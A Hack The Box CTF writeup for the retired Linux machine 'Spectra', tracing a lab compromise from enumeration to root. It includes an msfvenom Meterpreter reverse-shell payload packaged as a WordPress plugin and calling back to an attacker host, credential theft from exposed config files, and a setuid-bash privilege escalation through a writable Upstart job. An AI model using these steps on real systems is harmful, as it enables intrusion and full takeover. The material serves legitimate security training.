# 🛰️ Spectra - Hack The Box Writeup

![HTB](https://img.shields.io/badge/HTB-Retired-green)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![Category](https://img.shields.io/badge/Category-CTF-red)

## 📋 Machine Info

| Property | Value |
|----------|-------|
| **Difficulty** | Easy |
| **OS** | Linux (ChromeOS/Ubuntu) |
| **IP** | 10.10.10.229 |
| **Category** | CTF / Retired Machine |
| **Tags** | WordPress, Misconfigurations, Privilege Escalation, Upstart |

---

## Overview

This writeup covers the exploitation of the retired Hack The Box machine **Spectra**, which demonstrates real-world misconfigurations in web services and Linux privilege escalation paths.

### Key Steps:
- Discovering exposed directories
- Extracting credentials from a WordPress config file
- Gaining SSH access as a user
- Privilege escalation via Upstart's `initctl` misconfiguration

---

## Enumeration

### Port Scan (Nmap)

```bash
nmap -sC -sV -oA spectra 10.10.10.229
```

**Open Ports:**
```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
```

### Hostname Resolution

The site redirected to `spectra.htb`. To access it locally, add the following to `/etc/hosts`:

```
10.10.10.229 spectra.htb
```

---

## Web Reconnaissance

- **Main site:** WordPress with Twenty Twenty theme
- **Technologies:** PHP, MySQL, nginx (v1.17.4)

### Directory Enumeration (Gobuster)

```bash
gobuster dir -u http://spectra.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50
```

**Interesting paths discovered:**
- `/main/` — WordPress install
- `/testing/` — Development directory with directory listing enabled

---

## Initial Foothold

### Exposed Files in `/testing/`

Found the following files:
- `wp-config.php`
- `wp-config.php.save`

The `.save` file contained valid WordPress credentials.

### WordPress Admin Access

**Login URL:**
```
http://spectra.htb/main/wp-login.php
```

Successfully logged in as Administrator using credentials from `wp-config.php.save`.

---

## Remote Code Execution

### Failed Methods:
- Modifying the `404.php` theme file (write restricted)
- Uploading a basic reverse shell plugin (auto-deleted by WordPress)

### Successful Exploit - Meterpreter Plugin:

1. **Generate Meterpreter payload:**
```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.13 LPORT=4444 -f raw > shell.php
```

2. **Convert into valid plugin:**
```php
<?php
/*
Plugin Name: Meterpreter Reverse Shell
Description: Metasploit PHP reverse shell for HTB
Version: 1.0
Author: HTB User
*/
// msfvenom code here
```

3. **Compress and upload:**
```bash
zip meterpreter_plugin.zip shell.php
```

4. **Start listener in Metasploit:**
```bash
use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 10.10.14.13
set LPORT 4444
exploit
```

**Result:** Gained Meterpreter shell as `nginx` user.

---

## Credential Discovery

Located `/opt/autologin.conf.orig`, which referenced:
```
/etc/autologin/passwd
```

Dumping that file revealed plaintext credentials for user `katie`.

**SSH Access:**
```bash
ssh katie@spectra.htb
```

---

## Privilege Escalation

### Sudo Enumeration

```bash
sudo -l
```

**Output:**
```
(ALL) NOPASSWD: /sbin/initctl
```

### Exploitation

The file `/etc/init/test.conf` was writable by the `developers` group (katie is a member).

**Method:**
1. Edit the config to add: `exec chmod +s /bin/bash`
2. **Challenges faced:**
   - File was auto-restored
   - Service was already running
3. **Solution:**
   - Stop the service
   - Immediately modify and restart before restoration

**Root shell:**
```bash
bash -p
```

---

## 🏁 Flags

- **user.txt** — Obtained via SSH as `katie`
- **root.txt** — Obtained after privilege escalation

---

## Tools Used

| Category | Tools |
|----------|-------|
| **Reconnaissance** | nmap, Gobuster, curl, WhatWeb, Wappalyzer |
| **Exploitation** | Metasploit, msfvenom |
| **Post-Exploitation** | ssh, sudo, initctl, bash -p |

---

## Key Takeaways

- Misconfigured WordPress installations can expose sensitive files
- Directory listing can lead to full compromise  
- Upstart (`initctl`) misconfigurations are a reliable privilege escalation path
- Always enumerate users and permissions thoroughly post-exploitation

---

## ⚠️ Disclaimer

> **This writeup is for educational purposes only.**
> 
> Do not use these techniques on systems you do not own or have permission to test.
> 
> In accordance with the Hack The Box Terms of Service, this writeup covers only retired HTB machines. Publishing writeups of active machines is a violation of their rules and may lead to account suspension.

---

*Happy Hacking! 
